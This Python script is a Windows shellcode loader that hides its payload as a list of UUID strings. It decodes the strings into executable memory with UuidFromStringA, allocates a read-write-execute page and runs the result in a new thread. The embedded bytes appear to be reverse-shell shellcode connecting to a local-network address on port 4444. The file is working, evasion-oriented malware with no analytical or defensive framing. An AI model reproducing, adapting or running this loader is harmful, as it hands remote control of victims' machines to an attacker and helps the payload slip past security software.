import ctypes

uuid_list = [b'e48348fc-e8f0-00cc-0000-415141505248', b'5651d231-4865-528b-6048-8b5218488b52', b'b70f4820-4a4a-8b48-7250-4d31c94831c0', b'7c613cac-2c02-4120-c1c9-0d4101c1e2ed', b'48514152-528b-8b20-423c-4801d0668178', b'0f020b18-7285-0000-008b-808800000048', b'6774c085-0148-44d0-8b40-204901d0508b', b'56e31848-ff48-41c9-8b34-884801d64d31', b'c03148c9-c141-0dc9-ac41-01c138e075f1', b'244c034c-4508-d139-75d8-58448b402449', b'4166d001-0c8b-4448-8b40-1c4901d0418b', b'58418804-5841-0148-d05e-595a41584159', b'83485a41-20ec-5241-ffe0-5841595a488b', b'ff4be912-ffff-495d-be77-73325f333200', b'49564100-e689-8148-eca0-0100004989e5', b'0002bc49-5c11-a8c0-0180-41544989e44c', b'ba41f189-774c-0726-ffd5-4c89ea680101', b'41590000-29ba-6b80-00ff-d56a0a415e50', b'c9314d50-314d-48c0-ffc0-4889c248ffc0', b'41c18948-eaba-df0f-e0ff-d54889c76a10', b'894c5841-48e2-f989-41ba-99a57461ffd5', b'0a74c085-ff49-75ce-e5e8-930000004883', b'894810ec-4de2-c931-6a04-41584889f941', b'c8d902ba-ff5f-83d5-f800-7e554883c420', b'6af6895e-4140-6859-0010-000041584889', b'c93148f2-ba41-a458-53e5-ffd54889c349', b'314dc789-49c9-f089-4889-da4889f941ba', b'5fc8d902-d5ff-f883-007d-285841575968', b'00004000-5841-006a-5a41-ba0b2f0f30ff', b'415957d5-75ba-4d6e-61ff-d549ffcee93c', b'48ffffff-c301-2948-c648-85f675b441ff', b'006a58e7-4959-c2c7-f0b5-a256ffd50000']

uuid_list2 = []
for i in range(len(uuid_list)):
    uuid_list2.append(ctypes.string_at(uuid_list[i]))

ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_int64
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(uuid_list2) * 16, 0x3000, 0x40)
rwxpage = ptr

for i in range(len(uuid_list2)):
    ctypes.windll.Rpcrt4.UuidFromStringA(uuid_list2[i], ctypes.c_int64(rwxpage))
    rwxpage += 16

# ctypes.windll.kernel32.VirtualProtect(ctypes.c_int64(ptr), len(uuid_list2) * 16, 0x40)

handler = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_int64(ptr), 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handler, -1)
